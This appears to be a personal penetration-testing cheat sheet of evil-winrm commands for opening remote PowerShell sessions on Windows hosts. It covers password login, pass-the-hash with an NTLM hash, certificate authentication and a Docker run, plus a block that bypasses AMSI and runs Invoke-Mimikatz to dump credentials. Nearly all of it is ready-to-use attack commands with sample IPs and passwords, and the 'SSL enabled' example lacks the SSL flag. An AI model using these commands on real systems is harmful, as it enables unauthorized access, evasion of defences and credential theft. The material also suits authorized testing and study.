#windows #powershell
Connect with Scripts inside the ps1_scripts folder. and log all output.
`evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/' -l`

Connect with SSL enabled
`evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'`

Connect with Hash
	NTLM Hash
`evil-winrm -i 192.168.1.19 -u administrator -H 32196B56FFE6F45E294117B91A83BF38`

Connect with default escalation scripts
``
```bash
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell

Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz
```


Run from Docker
`docker run --rm -ti --name evil-winrm  oscarakaelvis/evil-winrm -i 192.168.1.105 -u Administrator -p 'Ignite@987'`

Run with PEM 
`evil-winrm -i 10.129.227.105 -c certificate.pem -k priv-key.pem -S`

